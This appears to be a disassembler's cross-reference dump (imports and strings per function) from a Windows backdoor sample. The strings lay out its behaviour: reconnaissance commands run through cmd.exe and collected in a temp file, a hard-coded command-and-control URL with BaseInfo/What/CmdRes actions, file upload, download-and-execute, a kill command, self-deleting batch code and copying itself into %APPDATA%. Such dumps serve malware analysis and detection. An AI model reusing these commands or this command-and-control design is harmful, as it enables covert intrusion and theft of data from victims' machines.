reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x40187e	0x41904c	import	0x4017d0	KERNEL32.dll.SetLastError
0x4018bd	0x41905c	import	0x4017d0	KERNEL32.dll.GetSystemInfo
0x4018d5	0x419054	import	0x4017d0	KERNEL32.dll.VirtualAlloc
0x401969	0x41904c	import	0x4017d0	KERNEL32.dll.SetLastError
0x4019c6	0x41904c	import	0x4019b0	KERNEL32.dll.SetLastError
0x401a0f	0x41b630	string	0x4019b0	InitDll
0x401a34	0x41904c	import	0x4019b0	KERNEL32.dll.SetLastError
0x401a52	0x41904c	import	0x4019b0	KERNEL32.dll.SetLastError
0x401a78	0x41904c	import	0x4019b0	KERNEL32.dll.SetLastError
0x401afd	0x419040	import	0x401a90	KERNEL32.dll.VirtualFree
0x401b06	0x419044	import	0x401a90	KERNEL32.dll.GetProcessHeap
0x401b0d	0x41903c	import	0x401a90	KERNEL32.dll.HeapFree
0x4022c0	0x4022cd	string	0x4021e0	Ky\v}
0x40261d	0x419188	import	0x4025f0	WINHTTP.dll.WinHttpCloseHandle
0x40280c	0x40281a	string	0x4025f0	3\t~p
0x40282d	0x40283b	string	0x4025f0	3҉~T blocks=Basic Latin,Cyrillic
0x40284e	0x40285c	string	0x4025f0	3ɉ~8 blocks=Basic Latin,Latin Extended-B
0x402995	0x402999	string	0x402890	VVVVP
0x40299e	0x41917c	import	0x402890	WINHTTP.dll.WinHttpOpen
0x4029aa	0x419028	import	0x402890	KERNEL32.dll.GetLastError
0x4029ed	0x4191a0	import	0x402890	WINHTTP.dll.WinHttpSetTimeouts
0x402a9e	0x419170	import	0x402890	WINHTTP.dll.WinHttpCrackUrl
0x402ae5	0x41918c	import	0x402890	WINHTTP.dll.WinHttpConnect
0x402b33	0x419178	import	0x402890	WINHTTP.dll.WinHttpOpenRequest
0x402b6e	0x41919c	import	0x402890	WINHTTP.dll.WinHttpSetOption
0x402ba8	0x419168	import	0x402890	WINHTTP.dll.WinHttpAddRequestHeaders
0x402bb2	0x419028	import	0x402890	KERNEL32.dll.GetLastError
0x402bc7	0x41b3ec	string	0x402890	Cookie:
0x402c13	0x419168	import	0x402890	WINHTTP.dll.WinHttpAddRequestHeaders
0x402c1d	0x419028	import	0x402890	KERNEL32.dll.GetLastError
0x402cbf	0x41919c	import	0x402890	WINHTTP.dll.WinHttpSetOption
0x402ce6	0x419028	import	0x402890	KERNEL32.dll.GetLastError
0x402cfa	0x402d69	string	0x402890	jjjjjj
0x402d1d	0x419028	import	0x402890	KERNEL32.dll.GetLastError
0x402d31	0x402d69	string	0x402890	jjjjjj
0x402d53	0x402d69	string	0x402890	jjjjjj
0x402d55	0x419028	import	0x402890	KERNEL32.dll.GetLastError
0x402d61	0x402d69	string	0x402890	jjjjjj
0x402d7d	0x419194	import	0x402890	WINHTTP.dll.WinHttpSendRequest
0x402dac	0x419198	import	0x402890	WINHTTP.dll.WinHttpGetIEProxyConfigForCurrentUser
0x402e4f	0x419174	import	0x402890	WINHTTP.dll.WinHttpGetProxyForUrl
0x402e69	0x41919c	import	0x402890	WINHTTP.dll.WinHttpSetOption
0x402e7a	0x419194	import	0x402890	WINHTTP.dll.WinHttpSendRequest
0x402e96	0x41908c	import	0x402890	KERNEL32.dll.GlobalFree
0x402eab	0x41908c	import	0x402890	KERNEL32.dll.GlobalFree
0x402f76	0x41919c	import	0x402890	WINHTTP.dll.WinHttpSetOption
0x402f80	0x419028	import	0x402890	KERNEL32.dll.GetLastError
0x402f97	0x41908c	import	0x402890	KERNEL32.dll.GlobalFree
0x402fa8	0x41908c	import	0x402890	KERNEL32.dll.GlobalFree
0x402fb9	0x41908c	import	0x402890	KERNEL32.dll.GlobalFree
0x402ff6	0x419190	import	0x402890	WINHTTP.dll.WinHttpWriteData
0x403000	0x419028	import	0x402890	KERNEL32.dll.GetLastError
0x40300f	0x419180	import	0x402890	WINHTTP.dll.WinHttpReceiveResponse
0x40301d	0x419184	import	0x402890	WINHTTP.dll.WinHttpQueryHeaders
0x403043	0x419028	import	0x402890	KERNEL32.dll.GetLastError
0x4030f8	0x41b400	string	0x402890	charset={[A-Za-z0-9\-_]+}
0x40314f	0x41b434	string	0x402890	Content-Length: {[0-9]+}
0x4031b6	0x41b468	string	0x402890	Location: {[0-9]+}
0x403214	0x41b490	string	0x402890	Set-Cookie:\b*{.+?}\n
0x403372	0x419184	import	0x402890	WINHTTP.dll.WinHttpQueryHeaders
0x4033a7	0x419028	import	0x402890	KERNEL32.dll.GetLastError
0x403488	0x419164	import	0x402890	WINHTTP.dll.WinHttpQueryDataAvailable
0x4034f1	0x41916c	import	0x402890	WINHTTP.dll.WinHttpReadData
0x40359c	0x419028	import	0x402890	KERNEL32.dll.GetLastError
0x403623	0x419020	import	0x402890	KERNEL32.dll.MultiByteToWideChar
0x40364f	0x419020	import	0x402890	KERNEL32.dll.MultiByteToWideChar
0x4036b8	0x419020	import	0x402890	KERNEL32.dll.MultiByteToWideChar
0x4036fa	0x41b4d4	string	0x402890	{<html>}
0x40376a	0x41b4e8	string	0x402890	{</html>}
0x4037e1	0x419028	import	0x402890	KERNEL32.dll.GetLastError
0x40381a	0x419188	import	0x402890	WINHTTP.dll.WinHttpCloseHandle
0x403827	0x419188	import	0x402890	WINHTTP.dll.WinHttpCloseHandle
0x403948	0x41b4fc	string	0x4038f0	0123456789abcdef
0x403a84	0x41b518	string	0x4038f0	Content-Disposition: form-data; name="
0x403ab6	0x41bd28	string	0x4038f0	string too long
0x403ad0	0x41bd28	string	0x4038f0	string too long
0x403b55	0x41b540	string	0x4038f0	"; filename="
0x403b87	0x41bd28	string	0x4038f0	string too long
0x403bc5	0x41bd28	string	0x4038f0	string too long
0x403c74	0x41b554	string	0x4038f0	Content-Type: application/x-www-form-urlencoded\r\n\r\n
0x403c89	0x41b588	string	0x4038f0	\r\n--
0x403cba	0x41b590	string	0x4038f0	--\r\n
0x403ecd	0x41b5a0	string	0x403e20	Content-Length:
0x403f13	0x41b5c8	string	0x403e20	\r\nContent-Type: multipart/form-data; boundary=
0x404145	0x41b670	string	0x4040e0	myfile
0x40426d	0x41b678	string	0x404200	%I64d.rst
0x4043a5	0x419088	import	0x404320	KERNEL32.dll.GetTempPathW
0x4043c0	0x419064	import	0x404320	KERNEL32.dll.GetTempFileNameW
0x4043cd	0x41b68c	string	0x404320	cmd.exe /c "hostname > %s"
0x4043f9	0x419068	import	0x404320	KERNEL32.dll.WaitForSingleObject
0x4043ff	0x419080	import	0x404320	KERNEL32.dll.TerminateProcess
0x404427	0x41902c	import	0x404320	KERNEL32.dll.CloseHandle
0x404434	0x41b6c4	string	0x404320	cmd.exe /c "whoami >> %s"
0x404482	0x41902c	import	0x404320	KERNEL32.dll.CloseHandle
0x40448f	0x41b6f8	string	0x404320	cmd.exe /c "ver >> %s"
0x4044dd	0x41902c	import	0x404320	KERNEL32.dll.CloseHandle
0x4044ea	0x41b728	string	0x404320	cmd.exe /c "ipconfig -all >> %s"
0x404538	0x41902c	import	0x404320	KERNEL32.dll.CloseHandle
0x404545	0x41b770	string	0x404320	cmd.exe /c "ping www.google.com >> %s"
0x404593	0x41902c	import	0x404320	KERNEL32.dll.CloseHandle
0x4045a0	0x41b7c0	string	0x404320	cmd.exe /c "query user >> %s"
0x4045ee	0x41902c	import	0x404320	KERNEL32.dll.CloseHandle
0x4045fb	0x41b7fc	string	0x404320	cmd.exe /c "net user >> %s"
0x404649	0x41902c	import	0x404320	KERNEL32.dll.CloseHandle
0x404656	0x41b834	string	0x404320	cmd.exe /c "net view >> %s"
0x4046a4	0x41902c	import	0x404320	KERNEL32.dll.CloseHandle
0x4046b1	0x41b870	string	0x404320	cmd.exe /c "net view /domain >> %s"
0x4046ff	0x41902c	import	0x404320	KERNEL32.dll.CloseHandle
0x40470c	0x41b8b8	string	0x404320	cmd.exe /c "reg query "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings" >> %s"
0x40475a	0x41902c	import	0x404320	KERNEL32.dll.CloseHandle
0x404767	0x41b978	string	0x404320	cmd.exe /c "tasklist /svc >> %s"
0x4047b5	0x41902c	import	0x404320	KERNEL32.dll.CloseHandle
0x4047c2	0x41b9c0	string	0x404320	cmd.exe /c "netstat -ano | find "TCP" >> %s"
0x404810	0x41902c	import	0x404320	KERNEL32.dll.CloseHandle
0x40490a	0x41ba20	string	0x404880	https://www.eye-watch.in/design/dfbox/list.jsp
0x40490f	0x41ba80	string	0x404880	%s?action=What&u=%I64u
0x404b76	0x419020	import	0x404880	KERNEL32.dll.MultiByteToWideChar
0x404bab	0x41bab0	string	0x404880	success
0x404bc7	0x41bac0	string	0x404880	killkill
0x404bdd	0x41bb1c	string	0x404880	http
0x404be9	0x41915c	import	0x404880	SHLWAPI.dll.StrStrIW
0x404c51	0x419088	import	0x404880	KERNEL32.dll.GetTempPathW
0x404cf1	0x41bb28	string	0x404880	.mui
0x404d14	0x41907c	import	0x404880	KERNEL32.dll.GetFileAttributesW
0x404dd4	0x4191a8	import	0x404880	urlmon.dll.URLDownloadToFileW
0x404df2	0x419090	import	0x404880	KERNEL32.dll.CreateThread
0x404dfd	0x41902c	import	0x404880	KERNEL32.dll.CloseHandle
0x404e08	0x419070	import	0x404880	KERNEL32.dll.Sleep
0x404e19	0x419028	import	0x404880	KERNEL32.dll.GetLastError
0x404e2e	0x41ba20	string	0x404880	https://www.eye-watch.in/design/dfbox/list.jsp
0x404e33	0x41bb40	string	0x404880	%s?action=CmdRes&u=%I64u&err=exec-%d
0x404f6d	0x419070	import	0x404880	KERNEL32.dll.Sleep
0x404f7e	0x41bd10	string	0x404880	invalid string position
0x404f88	0x41bd28	string	0x404880	string too long
0x404f9f	0x41ba20	string	0x404880	https://www.eye-watch.in/design/dfbox/list.jsp
0x404fa4	0x41bad8	string	0x404880	%s?action=CmdRes&u=%I64u&err=kill
0x4050ba	0x419028	import	0x404880	KERNEL32.dll.GetLastError
0x4050c1	0x41bb8c	string	0x404880	Error : %d\n
0x405151	0x41906c	import	0x4050f0	KERNEL32.dll.GetTickCount
0x4051b8	0x41ba20	string	0x4050f0	https://www.eye-watch.in/design/dfbox/list.jsp
0x4051bd	0x41bb98	string	0x4050f0	%s?action=BaseInfo&u=%I64u
0x405274	0x41ba20	string	0x4050f0	https://www.eye-watch.in/design/dfbox/list.jsp
0x405279	0x41ba80	string	0x4050f0	%s?action=What&u=%I64u
0x405365	0x41bbd0	string	0x405350	SelfDeleting...
0x40542f	0x419084	import	0x405350	KERNEL32.dll.GetModuleFileNameW
0x405441	0x419088	import	0x405350	KERNEL32.dll.GetTempPathW
0x40548e	0x41bbf8	string	0x405350	"%s" "%s"
0x4054ba	0x41bc18	string	0x405350	@echo off\r\n:del1\r\ndel /a %1\r\nif exist %1 goto del1\r\ndel /a %0
0x40551d	0x41900c	import	0x405350	KERNEL32.dll.CreateProcessW
0x4056a0	0x419084	import	0x405540	KERNEL32.dll.GetModuleFileNameW
0x4056cc	0x419078	import	0x405540	KERNEL32.dll.GetVersionExW
0x4056eb	0x41bc94	string	0x405540	%APPDATA%
0x4056f0	0x419094	import	0x405540	KERNEL32.dll.ExpandEnvironmentStringsW
0x405719	0x41bca8	string	0x405540	%s\%s\%s\%s\%s\%s\%s
0x405734	0x41bcd4	string	0x405540	%USERPROFILE%
0x405739	0x419094	import	0x405540	KERNEL32.dll.ExpandEnvironmentStringsW
0x40575e	0x41bcf0	string	0x405540	%s\%s\%s\%s\%s
0x405787	0x419074	import	0x405540	KERNEL32.dll.CopyFileW
0x405acf	0x405afa	string	0x4059c0	;}\bt\tW
0x405c6a	0x406780	string	0x405b80	;A\br\n
0x405c99	0x406780	string	0x405b80	;A\br\n
0x405cb2	0x406780	string	0x405b80	;A\br\n
0x405cf3	0x406780	string	0x405b80	;A\br\n
0x405d02	0x406780	string	0x405b80	;A\br\n
0x405d17	0x406780	string	0x405b80	;A\br\n
0x405d45	0x406780	string	0x405b80	;A\br\n
0x405d64	0x406780	string	0x405b80	;A\br\n
0x405d7d	0x406780	string	0x405b80	;A\br\n
0x405d9b	0x406780	string	0x405b80	;A\br\n
0x405dba	0x406780	string	0x405b80	;A\br\n
0x405ddc	0x406780	string	0x405b80	;A\br\n
0x405ed1	0x406780	string	0x405b80	;A\br\n
0x405f67	0x406780	string	0x405b80	;A\br\n
0x405fe5	0x406780	string	0x405b80	;A\br\n
0x405ffb	0x406780	string	0x405b80	;A\br\n
0x406019	0x406780	string	0x405b80	;A\br\n
0x40603a	0x406780	string	0x405b80	;A\br\n
0x406050	0x406780	string	0x405b80	;A\br\n
0x40606e	0x406780	string	0x405b80	;A\br\n
0x4060a2	0x406780	string	0x405b80	;A\br\n
0x4060b8	0x406780	string	0x405b80	;A\br\n
0x4060e4	0x406780	string	0x405b80	;A\br\n
0x406103	0x406780	string	0x405b80	;A\br\n
0x406132	0x406780	string	0x405b80	;A\br\n
0x406155	0x406780	string	0x405b80	;A\br\n
0x4063f2	0x41bd10	string	0x4063e0	invalid string position
0x406501	0x41bd28	string	0x406490	string too long
0x406645	0x41bd38	string	0x406620	vector<T> too long
0x40670c	0x406726	string	0x406700	;~\bw
0x4067cc	0x406811	string	0x4067a0	[_^]
0x406949	0x406966	string	0x406930	;^\bw
0x406a03	0x41bd10	string	0x4069f0	invalid string position
0x406a21	0x41bd28	string	0x4069f0	string too long
0x406b00	0x41bd28	string	0x406a90	string too long
0x406bc7	0x41bd28	string	0x406b70	string too long
0x406c53	0x41bd10	string	0x406c40	invalid string position
0x406c71	0x41bd28	string	0x406c40	string too long
0x406d64	0x41bd28	string	0x406cf0	string too long
0x406dda	0x41bd10	string	0x406dd0	invalid string position
0x406e58	0x41bd28	string	0x406e50	string too long
0x406f58	0x41bd38	string	0x406f20	vector<T> too long
0x407134	0x406780	string	0x407070	;A\br\n
0x40715f	0x406780	string	0x407070	;A\br\n
0x40716c	0x406780	string	0x407070	;A\br\n
0x407261	0x41bd10	string	0x407250	invalid string position
0x407298	0x41bd28	string	0x407250	string too long
0x407335	0x41bd28	string	0x407330	string too long
0x40765e	0x406780	string	0x407550	;A\br\n
0x407670	0x406780	string	0x407550	;A\br\n
0x40767d	0x406780	string	0x407550	;A\br\n
0x407690	0x406780	string	0x407550	;A\br\n
0x40769d	0x406780	string	0x407550	;A\br\n
0x4076aa	0x406780	string	0x407550	;A\br\n
0x40779a	0x406780	string	0x407550	;A\br\n
0x4077a7	0x406780	string	0x407550	;A\br\n
0x4077b6	0x406780	string	0x407550	;A\br\n
0x4077c2	0x406780	string	0x407550	;A\br\n
0x4077e5	0x406780	string	0x407550	;A\br\n
0x4077f8	0x406780	string	0x407550	;A\br\n
0x407874	0x406780	string	0x407550	;A\br\n
0x407898	0x406780	string	0x407550	;A\br\n
0x4078a5	0x406780	string	0x407550	;A\br\n
0x4078e2	0x407905	string	0x4078d0	;~\bw\a;~
0x40794a	0x41bd10	string	0x407940	invalid string position
0x407c00	0x407c68	string	0x407b70	_^[]
0x407c20	0x406780	string	0x407b70	;A\br\n
0x407c73	0x406780	string	0x407b70	;A\br\n
0x407cf6	0x406780	string	0x407b70	;A\br\n
0x407d2f	0x406780	string	0x407b70	;A\br\n
0x407db8	0x407dc5	string	0x407da0	;s\br\n
0x407ea2	0x406780	string	0x407da0	;A\br\n
0x407ec9	0x406780	string	0x407da0	;A\br\n
0x407ed5	0x406780	string	0x407da0	;A\br\n
0x407f2d	0x407f56	string	0x407f00	;{\br\n
0x40812e	0x406780	string	0x407ff0	;A\br\n
0x40813a	0x406780	string	0x407ff0	;A\br\n
0x40815a	0x406780	string	0x407ff0	;A\br\n
0x408166	0x406780	string	0x407ff0	;A\br\n
0x408187	0x406780	string	0x407ff0	;A\br\n
0x408833	0x41903c	import	0x40881d	KERNEL32.dll.HeapFree
0x408845	0x419028	import	0x40881d	KERNEL32.dll.GetLastError
0x40889c	0x419038	import	0x408857	KERNEL32.dll.HeapAlloc
0x408ab0	0x408ac9	string	0x408a9e	9E\ft
0x408d39	0x4190c8	import	0x408cfa	KERNEL32.dll.HeapReAlloc
0x4090b3	0x419204	string	0x40908f	Unknown exception
0x409b94	0x409bad	string	0x409afd	9M\bs
0x40a0ab	0x4190cc	import	0x40a0a0	KERNEL32.dll.GetSystemTimeAsFileTime
0x40a213	0x4190d4	import	0x40a1cf	KERNEL32.dll.HeapSetInformation
0x40a29d	0x4190d0	import	0x40a1cf	KERNEL32.dll.GetCommandLineW
0x40a41e	0x4190e4	import	0x40a365	KERNEL32.dll.IsDebuggerPresent
0x40a433	0x4190e0	import	0x40a365	KERNEL32.dll.SetUnhandledExceptionFilter
0x40a43e	0x4190dc	import	0x40a365	KERNEL32.dll.UnhandledExceptionFilter
0x40a45a	0x4190d8	import	0x40a365	KERNEL32.dll.GetCurrentProcess
0x40a461	0x419080	import	0x40a365	KERNEL32.dll.TerminateProcess
0x40a4fd	0x4190e8	import	0x40a4f4	KERNEL32.dll.HeapCreate
0x40a517	0x41924c	string	0x40a512	mscoree.dll
0x40a51c	0x4190ec	import	0x40a512	KERNEL32.dll.GetModuleHandleW
0x40a526	0x41923c	string	0x40a512	CorExitProcess
0x40a52c	0x419050	import	0x40a512	KERNEL32.dll.GetProcAddress
0x40a54e	0x4190f0	import	0x40a53d	KERNEL32.dll.ExitProcess
0x40a5a5	0x40a5b6	string	0x40a59a	;u\fr
0x40a699	0x4190f4	import	0x40a655	KERNEL32.dll.DecodePointer
0x40a7a1	0x40a655	string	0x40a795	j h
0x40a7b7	0x40a655	string	0x40a7ab	j h
0x40a7c7	0x40a655	string	0x40a7c1	j h
0x40a7d6	0x40a655	string	0x40a7d0	j h
0x40a88d	0x419c1c	string	0x40a823	Runtime Error!\n\nProgram:
0x40a8bf	0x419084	import	0x40a823	KERNEL32.dll.GetModuleFileNameW
0x40a8ce	0x419bec	string	0x40a823	<program name unknown>
0x40a971	0x4190f8	import	0x40a823	KERNEL32.dll.GetStdHandle
0x40a9bd	0x419014	import	0x40a823	KERNEL32.dll.WriteFile
0x40aa25	0x4190f4	import	0x40aa1a	KERNEL32.dll.DecodePointer
0x40aa44	0x4190fc	import	0x40aa42	KERNEL32.dll.EncodePointer
0x40aa4b	0x419100	import	0x40aa42	KERNEL32.dll.TlsAlloc
0x40aa5d	0x419104	import	0x40aa54	KERNEL32.dll.TlsGetValue
0x40aa6f	0x4190f4	import	0x40aa54	KERNEL32.dll.DecodePointer
0x40aa7e	0x419108	import	0x40aa54	KERNEL32.dll.TlsSetValue
0x40aa99	0x4190f4	import	0x40aa88	KERNEL32.dll.DecodePointer
0x40aab3	0x41910c	import	0x40aa88	KERNEL32.dll.TlsFree
0x40aad1	0x419c50	string	0x40aac5	KERNEL32.DLL
0x40aad6	0x4190ec	import	0x40aac5	KERNEL32.dll.GetModuleHandleW
0x40ab17	0x419110	import	0x40aac5	KERNEL32.dll.InterlockedIncrement
0x40ab7d	0x419028	import	0x40ab79	KERNEL32.dll.GetLastError
0x40abb9	0x4190f4	import	0x40ab79	KERNEL32.dll.DecodePointer
0x40abc8	0x40aac5	string	0x40ab79	j\bh@
0x40abcf	0x419114	import	0x40ab79	KERNEL32.dll.GetCurrentThreadId
0x40abe7	0x41904c	import	0x40ab79	KERNEL32.dll.SetLastError
0x40acaa	0x419118	import	0x40abf2	KERNEL32.dll.InterlockedDecrement
0x40ad3e	0x419c50	string	0x40ad3b	KERNEL32.DLL
0x40ad43	0x4190ec	import	0x40ad3b	KERNEL32.dll.GetModuleHandleW
0x40ad59	0x419050	import	0x40ad3b	KERNEL32.dll.GetProcAddress
0x40ad5f	0x419c8c	string	0x40ad3b	FlsAlloc
0x40ad67	0x419c80	string	0x40ad3b	FlsGetValue
0x40ad74	0x419c74	string	0x40ad3b	FlsSetValue
0x40ad81	0x419c6c	string	0x40ad3b	FlsFree
0x40ad95	0x419108	import	0x40ad3b	KERNEL32.dll.TlsSetValue
0x40addc	0x419100	import	0x40ad3b	KERNEL32.dll.TlsAlloc
0x40ae0c	0x4190fc	import	0x40ad3b	KERNEL32.dll.EncodePointer
0x40ae49	0x4190f4	import	0x40ad3b	KERNEL32.dll.DecodePointer
0x40ae4f	0x40ac0c	string	0x40ad3b	j\bhh
0x40ae94	0x40aac5	string	0x40ad3b	j\bh@
0x40ae9b	0x419114	import	0x40ad3b	KERNEL32.dll.GetCurrentThreadId
0x40af6a	0x41911c	import	0x40af49	KERNEL32.dll.GetCPInfo
0x40b1a6	0x419124	import	0x40b17d	KERNEL32.dll.GetOEMCP
0x40b1c9	0x419120	import	0x40b17d	KERNEL32.dll.GetACP
0x40b26c	0x419128	import	0x40b1f9	KERNEL32.dll.IsValidCodePage
0x40b27f	0x41911c	import	0x40b1f9	KERNEL32.dll.GetCPInfo
0x40b458	0x419118	import	0x40b3e2	KERNEL32.dll.InterlockedDecrement
0x40b477	0x419110	import	0x40b3e2	KERNEL32.dll.InterlockedIncrement
0x40b50f	0x419118	import	0x40b3e2	KERNEL32.dll.InterlockedDecrement
0x40b5a1	0x419110	import	0x40b59a	KERNEL32.dll.InterlockedIncrement
0x40b63c	0x419118	import	0x40b629	KERNEL32.dll.InterlockedDecrement
0x40bb0d	0x4190e4	import	0x40ba23	KERNEL32.dll.IsDebuggerPresent
0x40bb17	0x4190e0	import	0x40ba23	KERNEL32.dll.SetUnhandledExceptionFilter
0x40bb24	0x4190dc	import	0x40ba23	KERNEL32.dll.UnhandledExceptionFilter
0x40bb62	0x4190d8	import	0x40bb4c	KERNEL32.dll.GetCurrentProcess
0x40bb69	0x419080	import	0x40bb4c	KERNEL32.dll.TerminateProcess
0x40bb7c	0x4190f4	import	0x40bb71	KERNEL32.dll.DecodePointer
0x40bd8a	0x41912c	import	0x40bd4e	KERNEL32.dll.GetStringTypeW
0x40c84c	0x4190f4	import	0x40c153	KERNEL32.dll.DecodePointer
0x40ce6a	0x40ceb5	string	0x40cd60	X^_]ú blocks=Basic Latin,Latin-1 Supplement
0x40ce8f	0x40ceb5	string	0x40cd60	X^_]ú blocks=Basic Latin,Latin-1 Supplement
0x40ceaa	0x40ceb5	string	0x40cd60	X^_]ú blocks=Basic Latin,Latin-1 Supplement
0x40cef0	0x419130	import	0x40cd60	KERNEL32.dll.IsProcessorFeaturePresent
0x40d00d	0x419134	import	0x40cfd5	KERNEL32.dll.EnterCriticalSection
0x40d040	0x419134	import	0x40d016	KERNEL32.dll.EnterCriticalSection
0x40d07c	0x419138	import	0x40d048	KERNEL32.dll.LeaveCriticalSection
0x40d0ab	0x419138	import	0x40d084	KERNEL32.dll.LeaveCriticalSection
0x40d84f	0x4190f4	import	0x40d183	KERNEL32.dll.DecodePointer
0x40de39	0x40e4a2	string	0x40ddb2	UVWS
0x40df82	0x419038	import	0x40df3f	KERNEL32.dll.HeapAlloc
0x40e179	0x40e17e	string	0x40dfc1	f9>t
0x40e19e	0x40e1a3	string	0x40dfc1	f9>t
0x40e1d7	0x41a0f8	string	0x40dfc1	UTF-16LE
0x40e1f6	0x41a10c	string	0x40dfc1	UNICODE
0x40e336	0x41913c	import	0x40e27a	KERNEL32.dll.InitializeCriticalSectionAndSpinCount
0x40e35f	0x419134	import	0x40e27a	KERNEL32.dll.EnterCriticalSection
0x40e4db	0x40e4e6	string	0x40e4d2	_^[]
0x40ec74	0x4190f4	import	0x40e5ac	KERNEL32.dll.DecodePointer
0x40f185	0x419144	import	0x40f160	KERNEL32.dll.LCMapStringW
0x40f613	0x41902c	import	0x40f5c1	KERNEL32.dll.CloseHandle
0x40f61d	0x419028	import	0x40f5c1	KERNEL32.dll.GetLastError
0x40f88e	0x40f8a1	string	0x40f828	9}\bu
0x40f980	0x4190f4	import	0x40f978	KERNEL32.dll.DecodePointer
0x40f9ff	0x4190fc	import	0x40f978	KERNEL32.dll.EncodePointer
0x40fa0d	0x4190fc	import	0x40f978	KERNEL32.dll.EncodePointer
0x40fa3f	0x4190fc	import	0x40f978	KERNEL32.dll.EncodePointer
0x40faa3	0x40fa5f	string	0x40fa9b	j\fhx
0x40faf4	0x419148	import	0x40fab2	KERNEL32.dll.RaiseException
0x40fb45	0x4190e0	import	0x40fb00	KERNEL32.dll.SetUnhandledExceptionFilter
0x40fb9a	0x40fc94	string	0x40fb4e	_^]Ë blocks=Basic Latin,Latin-1 Supplement
0x40fbab	0x40fc94	string	0x40fb4e	_^]Ë blocks=Basic Latin,Latin-1 Supplement
0x40feea	0x419084	import	0x40feca	KERNEL32.dll.GetModuleFileNameW
0x40ff7b	0x419150	import	0x40ff78	KERNEL32.dll.GetEnvironmentStringsW
0x40ff90	0x40ffa2	string	0x40ff78	S+ƍX blocks=Basic Latin,Latin Extended-B
0x40ffb7	0x41914c	import	0x40ff78	KERNEL32.dll.FreeEnvironmentStringsW
0x40ffdd	0x4190bc	import	0x40ffd0	KERNEL32.dll.GetStartupInfoW
0x410011	0x410049	string	0x40ffd0	SWf9M
0x4100e1	0x410085	string	0x40ffd0	j@j
0x410110	0x4190c4	import	0x40ffd0	KERNEL32.dll.GetFileType
0x410146	0x41913c	import	0x40ffd0	KERNEL32.dll.InitializeCriticalSectionAndSpinCount
0x41019a	0x4190f8	import	0x40ffd0	KERNEL32.dll.GetStdHandle
0x4101ac	0x4190c4	import	0x40ffd0	KERNEL32.dll.GetFileType
0x4101da	0x41913c	import	0x40ffd0	KERNEL32.dll.InitializeCriticalSectionAndSpinCount
